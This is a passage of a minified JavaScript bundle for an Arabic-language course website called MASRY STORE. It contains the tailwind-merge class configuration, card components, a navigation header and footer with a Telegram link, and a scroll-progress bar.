u.isThemeGetter=!0,u},zp=/^\[(?:(\w[\w-]*):)?(.+)\]$/i,Op=/^\((?:(\w[\w-]*):)?(.+)\)$/i,U1=/^\d+\/\d+$/,B1=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,G1=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,q1=/^(rgba?|hsla?|hwb|(ok)?(lab|lch)|color-mix)\(.+\)$/,Y1=/^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,V1=/^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,tn=o=>U1.test(o),ce=o=>!!o&&!Number.isNaN(Number(o)),Xl=o=>!!o&&Number.isInteger(Number(o)),dc=o=>o.endsWith("%")&&ce(o.slice(0,-1)),fl=o=>B1.test(o),P1=()=>!0,X1=o=>G1.test(o)&&!q1.test(o),kp=()=>!1,Q1=o=>Y1.test(o),K1=o=>V1.test(o),Z1=o=>!Q(o)&&!K(o),J1=o=>an(o,Up,kp),Q=o=>zp.test(o),pa=o=>an(o,Bp,X1),fc=o=>an(o,e0,ce),Ih=o=>an(o,Hp,kp),W1=o=>an(o,Lp,K1),wo=o=>an(o,Gp,Q1),K=o=>Op.test(o),ts=o=>nn(o,Bp),F1=o=>nn(o,t0),$h=o=>nn(o,Hp),I1=o=>nn(o,Up),$1=o=>nn(o,Lp),Ro=o=>nn(o,Gp,!0),an=(o,u,d)=>{const r=zp.exec(o);return r?r[1]?u(r[1]):d(r[2]):!1},nn=(o,u,d=!1)=>{const r=Op.exec(o);return r?r[1]?u(r[1]):d:!1},Hp=o=>o==="position"||o==="percentage",Lp=o=>o==="image"||o==="url",Up=o=>o==="length"||o==="size"||o==="bg-size",Bp=o=>o==="length",e0=o=>o==="number",t0=o=>o==="family-name",Gp=o=>o==="shadow",l0=()=>{const o=Qe("color"),u=Qe("font"),d=Qe("text"),r=Qe("font-weight"),f=Qe("tracking"),p=Qe("leading"),x=Qe("breakpoint"),v=Qe("container"),g=Qe("spacing"),m=Qe("radius"),T=Qe("shadow"),A=Qe("inset-shadow"),z=Qe("text-shadow"),V=Qe("drop-shadow"),q=Qe("blur"),L=Qe("perspective"),H=Qe("aspect"),Z=Qe("ease"),I=Qe("animate"),J=()=>["auto","avoid","all","avoid-page","page","left","right","column"],se=()=>["center","top","bottom","left","right","top-left","left-top","top-right","right-top","bottom-right","right-bottom","bottom-left","left-bottom"],ee=()=>[...se(),K,Q],ue=()=>["auto","hidden","clip","visible","scroll"],F=()=>["auto","contain","none"],P=()=>[K,Q,g],Ee=()=>[tn,"full","auto",...P()],ht=()=>[Xl,"none","subgrid",K,Q],nt=()=>["auto",{span:["full",Xl,K,Q]},Xl,K,Q],Ue=()=>[Xl,"auto",K,Q],pt=()=>["auto","min","max","fr",K,Q],tt=()=>["start","end","center","between","around","evenly","stretch","baseline","center-safe","end-safe"],we=()=>["start","end","center","stretch","center-safe","end-safe"],M=()=>["auto",...P()],G=()=>[tn,"auto","full","dvw","dvh","lvw","lvh","svw","svh","min","max","fit",...P()],U=()=>[o,K,Q],ve=()=>[...se(),$h,Ih,{position:[K,Q]}],Se=()=>["no-repeat",{repeat:["","x","y","space","round"]}],S=()=>["auto","cover","contain",I1,J1,{size:[K,Q]}],O=()=>[dc,ts,pa],B=()=>["","none","full",m,K,Q],Y=()=>["",ce,ts,pa],ae=()=>["solid","dashed","dotted","double"],re=()=>["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity"],le=()=>[ce,dc,$h,Ih],Ke=()=>["","none",q,K,Q],De=()=>["none",ce,K,Q],qt=()=>["none",ce,K,Q],bl=()=>[ce,K,Q],vl=()=>[tn,"full",...P()];return{cacheSize:500,theme:{animate:["spin","ping","pulse","bounce"],aspect:["video"],blur:[fl],breakpoint:[fl],color:[P1],container:[fl],"drop-shadow":[fl],ease:["in","out","in-out"],font:[Z1],"font-weight":["thin","extralight","light","normal","medium","semibold","bold","extrabold","black"],"inset-shadow":[fl],leading:["none","tight","snug","normal","relaxed","loose"],perspective:["dramatic","near","normal","midrange","distant","none"],radius:[fl],shadow:[fl],spacing:["px",ce],text:[fl],"text-shadow":[fl],tracking:["tighter","tight","normal","wide","wider","widest"]},classGroups:{aspect:[{aspect:["auto","square",tn,Q,K,H]}],container:["container"],columns:[{columns:[ce,Q,K,v]}],"break-after":[{"break-after":J()}],"break-before":[{"break-before":J()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],sr:["sr-only","not-sr-only"],float:[{float:["right","left","none","start","end"]}],clear:[{clear:["left","right","both","none","start","end"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:ee()}],overflow:[{overflow:ue()}],"overflow-x":[{"overflow-x":ue()}],"overflow-y":[{"overflow-y":ue()}],overscroll:[{overscroll:F()}],"overscroll-x":[{"overscroll-x":F()}],"overscroll-y":[{"overscroll-y":F()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:Ee()}],"inset-x":[{"inset-x":Ee()}],"inset-y":[{"inset-y":Ee()}],start:[{start:Ee()}],end:[{end:Ee()}],top:[{top:Ee()}],right:[{right:Ee()}],bottom:[{bottom:Ee()}],left:[{left:Ee()}],visibility:["visible","invisible","collapse"],z:[{z:[Xl,"auto",K,Q]}],basis:[{basis:[tn,"full","auto",v,...P()]}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["nowrap","wrap","wrap-reverse"]}],flex:[{flex:[ce,tn,"auto","initial","none",Q]}],grow:[{grow:["",ce,K,Q]}],shrink:[{shrink:["",ce,K,Q]}],order:[{order:[Xl,"first","last","none",K,Q]}],"grid-cols":[{"grid-cols":ht()}],"col-start-end":[{col:nt()}],"col-start":[{"col-start":Ue()}],"col-end":[{"col-end":Ue()}],"grid-rows":[{"grid-rows":ht()}],"row-start-end":[{row:nt()}],"row-start":[{"row-start":Ue()}],"row-end":[{"row-end":Ue()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":pt()}],"auto-rows":[{"auto-rows":pt()}],gap:[{gap:P()}],"gap-x":[{"gap-x":P()}],"gap-y":[{"gap-y":P()}],"justify-content":[{justify:[...tt(),"normal"]}],"justify-items":[{"justify-items":[...we(),"normal"]}],"justify-self":[{"justify-self":["auto",...we()]}],"align-content":[{content:["normal",...tt()]}],"align-items":[{items:[...we(),{baseline:["","last"]}]}],"align-self":[{self:["auto",...we(),{baseline:["","last"]}]}],"place-content":[{"place-content":tt()}],"place-items":[{"place-items":[...we(),"baseline"]}],"place-self":[{"place-self":["auto",...we()]}],p:[{p:P()}],px:[{px:P()}],py:[{py:P()}],ps:[{ps:P()}],pe:[{pe:P()}],pt:[{pt:P()}],pr:[{pr:P()}],pb:[{pb:P()}],pl:[{pl:P()}],m:[{m:M()}],mx:[{mx:M()}],my:[{my:M()}],ms:[{ms:M()}],me:[{me:M()}],mt:[{mt:M()}],mr:[{mr:M()}],mb:[{mb:M()}],ml:[{ml:M()}],"space-x":[{"space-x":P()}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":P()}],"space-y-reverse":["space-y-reverse"],size:[{size:G()}],w:[{w:[v,"screen",...G()]}],"min-w":[{"min-w":[v,"screen","none",...G()]}],"max-w":[{"max-w":[v,"screen","none","prose",{screen:[x]},...G()]}],h:[{h:["screen","lh",...G()]}],"min-h":[{"min-h":["screen","lh","none",...G()]}],"max-h":[{"max-h":["screen","lh",...G()]}],"font-size":[{text:["base",d,ts,pa]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:[r,K,fc]}],"font-stretch":[{"font-stretch":["ultra-condensed","extra-condensed","condensed","semi-condensed","normal","semi-expanded","expanded","extra-expanded","ultra-expanded",dc,Q]}],"font-family":[{font:[F1,Q,u]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractions"],tracking:[{tracking:[f,K,Q]}],"line-clamp":[{"line-clamp":[ce,"none",K,fc]}],leading:[{leading:[p,...P()]}],"list-image":[{"list-image":["none",K,Q]}],"list-style-position":[{list:["inside","outside"]}],"list-style-type":[{list:["disc","decimal","none",K,Q]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"placeholder-color":[{placeholder:U()}],"text-color":[{text:U()}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[...ae(),"wavy"]}],"text-decoration-thickness":[{decoration:[ce,"from-font","auto",K,pa]}],"text-decoration-color":[{decoration:U()}],"underline-offset":[{"underline-offset":[ce,"auto",K,Q]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],"text-wrap":[{text:["wrap","nowrap","balance","pretty"]}],indent:[{indent:P()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",K,Q]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],wrap:[{wrap:["break-word","anywhere","normal"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",K,Q]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:ve()}],"bg-repeat":[{bg:Se()}],"bg-size":[{bg:S()}],"bg-image":[{bg:["none",{linear:[{to:["t","tr","r","br","b","bl","l","tl"]},Xl,K,Q],radial:["",K,Q],conic:[Xl,K,Q]},$1,W1]}],"bg-color":[{bg:U()}],"gradient-from-pos":[{from:O()}],"gradient-via-pos":[{via:O()}],"gradient-to-pos":[{to:O()}],"gradient-from":[{from:U()}],"gradient-via":[{via:U()}],"gradient-to":[{to:U()}],rounded:[{rounded:B()}],"rounded-s":[{"rounded-s":B()}],"rounded-e":[{"rounded-e":B()}],"rounded-t":[{"rounded-t":B()}],"rounded-r":[{"rounded-r":B()}],"rounded-b":[{"rounded-b":B()}],"rounded-l":[{"rounded-l":B()}],"rounded-ss":[{"rounded-ss":B()}],"rounded-se":[{"rounded-se":B()}],"rounded-ee":[{"rounded-ee":B()}],"rounded-es":[{"rounded-es":B()}],"rounded-tl":[{"rounded-tl":B()}],"rounded-tr":[{"rounded-tr":B()}],"rounded-br":[{"rounded-br":B()}],"rounded-bl":[{"rounded-bl":B()}],"border-w":[{border:Y()}],"border-w-x":[{"border-x":Y()}],"border-w-y":[{"border-y":Y()}],"border-w-s":[{"border-s":Y()}],"border-w-e":[{"border-e":Y()}],"border-w-t":[{"border-t":Y()}],"border-w-r":[{"border-r":Y()}],"border-w-b":[{"border-b":Y()}],"border-w-l":[{"border-l":Y()}],"divide-x":[{"divide-x":Y()}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":Y()}],"divide-y-reverse":["divide-y-reverse"],"border-style":[{border:[...ae(),"hidden","none"]}],"divide-style":[{divide:[...ae(),"hidden","none"]}],"border-color":[{border:U()}],"border-color-x":[{"border-x":U()}],"border-color-y":[{"border-y":U()}],"border-color-s":[{"border-s":U()}],"border-color-e":[{"border-e":U()}],"border-color-t":[{"border-t":U()}],"border-color-r":[{"border-r":U()}],"border-color-b":[{"border-b":U()}],"border-color-l":[{"border-l":U()}],"divide-color":[{divide:U()}],"outline-style":[{outline:[...ae(),"none","hidden"]}],"outline-offset":[{"outline-offset":[ce,K,Q]}],"outline-w":[{outline:["",ce,ts,pa]}],"outline-color":[{outline:U()}],shadow:[{shadow:["","none",T,Ro,wo]}],"shadow-color":[{shadow:U()}],"inset-shadow":[{"inset-shadow":["none",A,Ro,wo]}],"inset-shadow-color":[{"inset-shadow":U()}],"ring-w":[{ring:Y()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:U()}],"ring-offset-w":[{"ring-offset":[ce,pa]}],"ring-offset-color":[{"ring-offset":U()}],"inset-ring-w":[{"inset-ring":Y()}],"inset-ring-color":[{"inset-ring":U()}],"text-shadow":[{"text-shadow":["none",z,Ro,wo]}],"text-shadow-color":[{"text-shadow":U()}],opacity:[{opacity:[ce,K,Q]}],"mix-blend":[{"mix-blend":[...re(),"plus-darker","plus-lighter"]}],"bg-blend":[{"bg-blend":re()}],"mask-clip":[{"mask-clip":["border","padding","content","fill","stroke","view"]},"mask-no-clip"],"mask-composite":[{mask:["add","subtract","intersect","exclude"]}],"mask-image-linear-pos":[{"mask-linear":[ce]}],"mask-image-linear-from-pos":[{"mask-linear-from":le()}],"mask-image-linear-to-pos":[{"mask-linear-to":le()}],"mask-image-linear-from-color":[{"mask-linear-from":U()}],"mask-image-linear-to-color":[{"mask-linear-to":U()}],"mask-image-t-from-pos":[{"mask-t-from":le()}],"mask-image-t-to-pos":[{"mask-t-to":le()}],"mask-image-t-from-color":[{"mask-t-from":U()}],"mask-image-t-to-color":[{"mask-t-to":U()}],"mask-image-r-from-pos":[{"mask-r-from":le()}],"mask-image-r-to-pos":[{"mask-r-to":le()}],"mask-image-r-from-color":[{"mask-r-from":U()}],"mask-image-r-to-color":[{"mask-r-to":U()}],"mask-image-b-from-pos":[{"mask-b-from":le()}],"mask-image-b-to-pos":[{"mask-b-to":le()}],"mask-image-b-from-color":[{"mask-b-from":U()}],"mask-image-b-to-color":[{"mask-b-to":U()}],"mask-image-l-from-pos":[{"mask-l-from":le()}],"mask-image-l-to-pos":[{"mask-l-to":le()}],"mask-image-l-from-color":[{"mask-l-from":U()}],"mask-image-l-to-color":[{"mask-l-to":U()}],"mask-image-x-from-pos":[{"mask-x-from":le()}],"mask-image-x-to-pos":[{"mask-x-to":le()}],"mask-image-x-from-color":[{"mask-x-from":U()}],"mask-image-x-to-color":[{"mask-x-to":U()}],"mask-image-y-from-pos":[{"mask-y-from":le()}],"mask-image-y-to-pos":[{"mask-y-to":le()}],"mask-image-y-from-color":[{"mask-y-from":U()}],"mask-image-y-to-color":[{"mask-y-to":U()}],"mask-image-radial":[{"mask-radial":[K,Q]}],"mask-image-radial-from-pos":[{"mask-radial-from":le()}],"mask-image-radial-to-pos":[{"mask-radial-to":le()}],"mask-image-radial-from-color":[{"mask-radial-from":U()}],"mask-image-radial-to-color":[{"mask-radial-to":U()}],"mask-image-radial-shape":[{"mask-radial":["circle","ellipse"]}],"mask-image-radial-size":[{"mask-radial":[{closest:["side","corner"],farthest:["side","corner"]}]}],"mask-image-radial-pos":[{"mask-radial-at":se()}],"mask-image-conic-pos":[{"mask-conic":[ce]}],"mask-image-conic-from-pos":[{"mask-conic-from":le()}],"mask-image-conic-to-pos":[{"mask-conic-to":le()}],"mask-image-conic-from-color":[{"mask-conic-from":U()}],"mask-image-conic-to-color":[{"mask-conic-to":U()}],"mask-mode":[{mask:["alpha","luminance","match"]}],"mask-origin":[{"mask-origin":["border","padding","content","fill","stroke","view"]}],"mask-position":[{mask:ve()}],"mask-repeat":[{mask:Se()}],"mask-size":[{mask:S()}],"mask-type":[{"mask-type":["alpha","luminance"]}],"mask-image":[{mask:["none",K,Q]}],filter:[{filter:["","none",K,Q]}],blur:[{blur:Ke()}],brightness:[{brightness:[ce,K,Q]}],contrast:[{contrast:[ce,K,Q]}],"drop-shadow":[{"drop-shadow":["","none",V,Ro,wo]}],"drop-shadow-color":[{"drop-shadow":U()}],grayscale:[{grayscale:["",ce,K,Q]}],"hue-rotate":[{"hue-rotate":[ce,K,Q]}],invert:[{invert:["",ce,K,Q]}],saturate:[{saturate:[ce,K,Q]}],sepia:[{sepia:["",ce,K,Q]}],"backdrop-filter":[{"backdrop-filter":["","none",K,Q]}],"backdrop-blur":[{"backdrop-blur":Ke()}],"backdrop-brightness":[{"backdrop-brightness":[ce,K,Q]}],"backdrop-contrast":[{"backdrop-contrast":[ce,K,Q]}],"backdrop-grayscale":[{"backdrop-grayscale":["",ce,K,Q]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[ce,K,Q]}],"backdrop-invert":[{"backdrop-invert":["",ce,K,Q]}],"backdrop-opacity":[{"backdrop-opacity":[ce,K,Q]}],"backdrop-saturate":[{"backdrop-saturate":[ce,K,Q]}],"backdrop-sepia":[{"backdrop-sepia":["",ce,K,Q]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":P()}],"border-spacing-x":[{"border-spacing-x":P()}],"border-spacing-y":[{"border-spacing-y":P()}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["","all","colors","opacity","shadow","transform","none",K,Q]}],"transition-behavior":[{transition:["normal","discrete"]}],duration:[{duration:[ce,"initial",K,Q]}],ease:[{ease:["linear","initial",Z,K,Q]}],delay:[{delay:[ce,K,Q]}],animate:[{animate:["none",I,K,Q]}],backface:[{backface:["hidden","visible"]}],perspective:[{perspective:[L,K,Q]}],"perspective-origin":[{"perspective-origin":ee()}],rotate:[{rotate:De()}],"rotate-x":[{"rotate-x":De()}],"rotate-y":[{"rotate-y":De()}],"rotate-z":[{"rotate-z":De()}],scale:[{scale:qt()}],"scale-x":[{"scale-x":qt()}],"scale-y":[{"scale-y":qt()}],"scale-z":[{"scale-z":qt()}],"scale-3d":["scale-3d"],skew:[{skew:bl()}],"skew-x":[{"skew-x":bl()}],"skew-y":[{"skew-y":bl()}],transform:[{transform:[K,Q,"","none","gpu","cpu"]}],"transform-origin":[{origin:ee()}],"transform-style":[{transform:["3d","flat"]}],translate:[{translate:vl()}],"translate-x":[{"translate-x":vl()}],"translate-y":[{"translate-y":vl()}],"translate-z":[{"translate-z":vl()}],"translate-none":["translate-none"],accent:[{accent:U()}],appearance:[{appearance:["none","auto"]}],"caret-color":[{caret:U()}],"color-scheme":[{scheme:["normal","dark","light","light-dark","only-dark","only-light"]}],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",K,Q]}],"field-sizing":[{"field-sizing":["fixed","content"]}],"pointer-events":[{"pointer-events":["auto","none"]}],resize:[{resize:["none","","y","x"]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":P()}],"scroll-mx":[{"scroll-mx":P()}],"scroll-my":[{"scroll-my":P()}],"scroll-ms":[{"scroll-ms":P()}],"scroll-me":[{"scroll-me":P()}],"scroll-mt":[{"scroll-mt":P()}],"scroll-mr":[{"scroll-mr":P()}],"scroll-mb":[{"scroll-mb":P()}],"scroll-ml":[{"scroll-ml":P()}],"scroll-p":[{"scroll-p":P()}],"scroll-px":[{"scroll-px":P()}],"scroll-py":[{"scroll-py":P()}],"scroll-ps":[{"scroll-ps":P()}],"scroll-pe":[{"scroll-pe":P()}],"scroll-pt":[{"scroll-pt":P()}],"scroll-pr":[{"scroll-pr":P()}],"scroll-pb":[{"scroll-pb":P()}],"scroll-pl":[{"scroll-pl":P()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","manipulation"]}],"touch-x":[{"touch-pan":["x","left","right"]}],"touch-y":[{"touch-pan":["y","up","down"]}],"touch-pz":["touch-pinch-zoom"],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",K,Q]}],fill:[{fill:["none",...U()]}],"stroke-w":[{stroke:[ce,ts,pa,fc]}],stroke:[{stroke:["none",...U()]}],"forced-color-adjust":[{"forced-color-adjust":["auto","none"]}]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],size:["w","h"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],"line-clamp":["display","overflow"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-x","border-w-y","border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-x","border-color-y","border-color-s","border-color-e","border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],translate:["translate-x","translate-y","translate-none"],"translate-none":["translate","translate-x","translate-y","translate-z"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"],touch:["touch-x","touch-y","touch-pz"],"touch-x":["touch"],"touch-y":["touch"],"touch-pz":["touch"]},conflictingClassGroupModifiers:{"font-size":["leading"]},orderSensitiveModifiers:["*","**","after","backdrop","before","details-content","file","first-letter","first-line","marker","placeholder","selection"]}},a0=H1(l0);function rs(...o){return a0(wp(o))}function pl({className:o,...u}){return i.jsx("div",{"code-path":"src/components/ui/card.tsx:7:5","data-slot":"card",className:rs("bg-card text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm",o),...u})}function ml({className:o,...u}){return i.jsx("div",{"code-path":"src/components/ui/card.tsx:66:5","data-slot":"card-content",className:rs("px-6",o),...u})}const ep=[{path:"/",label:"الرئيسية"},{path:"/courses",label:"الدورات"},{path:"/learning-paths",label:"الخطط التعليمية"},{path:"/about",label:"المدرب"},{path:"/contact",label:"تواصل"}];function n0(){const o=Kt(),[u,d]=N.useState(!1);return i.jsx("header",{"code-path":"src/components/layout/Header.tsx:17:5",className:"sticky top-0 z-50 bg-cyber-surface/90 backdrop-blur-xl border-b border-neon/30",children:i.jsxs("nav",{"code-path":"src/components/layout/Header.tsx:18:7",className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",children:[i.jsxs("div",{"code-path":"src/components/layout/Header.tsx:19:9",className:"flex items-center justify-between h-16",children:[i.jsxs(at,{"code-path":"src/components/layout/Header.tsx:21:11",to:"/",className:"flex items-center gap-2 shrink-0",children:[i.jsx("i",{"code-path":"src/components/layout/Header.tsx:22:13",className:"fas fa-crown text-neon text-2xl"}),i.jsx("span",{"code-path":"src/components/layout/Header.tsx:23:13",className:"text-xl sm:text-2xl font-black gradient-text",children:"MASRY STORE"})]}),i.jsx("ul",{"code-path":"src/components/layout/Header.tsx:29:11",className:"hidden md:flex items-center gap-6 lg:gap-8",children:ep.map(r=>i.jsx("li",{"code-path":"src/components/layout/Header.tsx:31:15",children:i.jsx(at,{"code-path":"src/components/layout/Header.tsx:32:17",to:r.path,className:`font-semibold text-sm lg:text-base py-1 border-b-2 transition-all duration-300 hover:text-neon hover:border-neon hover:drop-shadow-[0_0_4px_rgba(0,255,0,0.5)] ${o.pathname===r.path?"border-neon text-neon drop-shadow-[0_0_4px_rgba(0,255,0,0.5)]":"border-transparent text-foreground/80"}`,children:r.label})},r.path))}),i.jsx("button",{"code-path":"src/components/layout/Header.tsx:47:11",onClick:()=>d(!u),className:"md:hidden text-neon p-2","aria-label":"Toggle menu",children:i.jsx("i",{"code-path":"src/components/layout/Header.tsx:52:13",className:`fas ${u?"fa-times":"fa-bars"} text-xl`})})]}),u&&i.jsx("div",{"code-path":"src/components/layout/Header.tsx:58:11",className:"md:hidden pb-4 border-t border-neon/20",children:i.jsx("ul",{"code-path":"src/components/layout/Header.tsx:59:13",className:"flex flex-col gap-2 pt-4",children:ep.map(r=>i.jsx("li",{"code-path":"src/components/layout/Header.tsx:61:17",children:i.jsx(at,{"code-path":"src/components/layout/Header.tsx:62:19",to:r.path,onClick:()=>d(!1),className:`block font-semibold py-2 px-4 rounded-lg transition-all ${o.pathname===r.path?"bg-neon/10 text-neon border-r-2 border-neon":"text-foreground/80 hover:bg-neon/5 hover:text-neon"}`,children:r.label})},r.path))})})]})})}function s0(){return i.jsx("footer",{"code-path":"src/components/layout/Footer.tsx:5:5",className:"bg-cyber-bg border-t border-cyber-border mt-auto",children:i.jsxs("div",{"code-path":"src/components/layout/Footer.tsx:6:7",className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8",children:[i.jsxs("div",{"code-path":"src/components/layout/Footer.tsx:7:9",className:"flex flex-col md:flex-row items-center justify-between gap-4",children:[i.jsx("p",{"code-path":"src/components/layout/Footer.tsx:8:11",className:"text-muted-foreground text-sm",children:"© 2025 MASRY STORE - جميع الحقوق محفوظة"}),i.jsxs("div",{"code-path":"src/components/layout/Footer.tsx:11:11",className:"flex items-center gap-6",children:[i.jsxs("a",{"code-path":"src/components/layout/Footer.tsx:12:13",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:text-neon-bright transition-colors text-sm flex items-center gap-1",children:[i.jsx("i",{"code-path":"src/components/layout/Footer.tsx:18:15",className:"fab fa-telegram-plane"}),i.jsx("span",{"code-path":"src/components/layout/Footer.tsx:19:15",children:"قناة التليجرام"})]}),i.jsxs(at,{"code-path":"src/components/layout/Footer.tsx:21:13",to:"/contact",className:"text-neon hover:text-neon-bright transition-colors text-sm flex items-center gap-1",children:[i.jsx("i",{"code-path":"src/components/layout/Footer.tsx:25:15",className:"fas fa-headset"}),i.jsx("span",{"code-path":"src/components/layout/Footer.tsx:26:15",children:"اتصل بنا"})]})]})]}),i.jsxs("div",{"code-path":"src/components/layout/Footer.tsx:30:9",className:"flex justify-center gap-4 mt-4 text-xs text-muted-foreground",children:[i.jsx(at,{"code-path":"src/components/layout/Footer.tsx:31:11",to:"/privacy",className:"hover:text-neon transition-colors",children:"سياسة الخصوصية"}),i.jsx("span",{"code-path":"src/components/layout/Footer.tsx:32:11",children:"|"}),i.jsx(at,{"code-path":"src/components/layout/Footer.tsx:33:11",to:"/terms",className:"hover:text-neon transition-colors",children:"شروط الاستخدام"})]})]})})}function o0(){const[o,u]=N.useState(0);return N.useEffect(()=>{const d=()=>{const r=window.scrollY,f=document.documentElement.scrollHeight-window.innerHeight,p=f>0?r/f*100:0;u(p)};return window.addEventListener("scroll",d,{passive:!0}),()=>window.removeEventListener("scroll",d)},[]),i.jsx("div",{"code-path":"src/components/ScrollProgress.tsx:19:5",className:"fixed top-0 left-0 right-0 h-[2px] z-[100]",style:{background:"linear-gradient(90deg, #0f0, #8fff8f)",width:`${o}%`,transition:"width 0.1s linear",boxShadow:"0 0 8px rgba(0,255,0,0.5)"}})}const i0=o=>o.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),r0=o=>o.replace(/^([A-Z])|[\s-_]+(\w)/g,(u,d,r)=>r?r.toUpperCase():d.toLowerCase()),tp=o=>{const u=r0(o);return u.charAt(0).toUpperCase()+u.slice(1)},qp=(...o)=>o.filter((u,d,r)=>!!u&&u.trim()!==""&&r.indexOf(u)===d).join(" ").trim(),c0=o=>{for(const u in o)if(u.startsWith("aria-")||u==="role"||u==="title")return!0};var u0={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const d0=N.forwardRef(({color:o="currentColor",size:u=24,strokeWidth:d=2,absoluteStrokeWidth:r,className:f="",children:p,iconNode:x,...v},g)=>N.createElement("svg",{ref:g,...u0,width:u,height:u,stroke:o,strokeWidth:r?Number(d)*24/Number(u):d,className:qp("lucide",f),...!p&&!c0(v)&&{"aria-hidden":"true"},...v},[...x.map(([m,T])=>N.createElement(m,T)),...Array.isArray(p)?p:[p]]));const Me=(o,u)=>{const 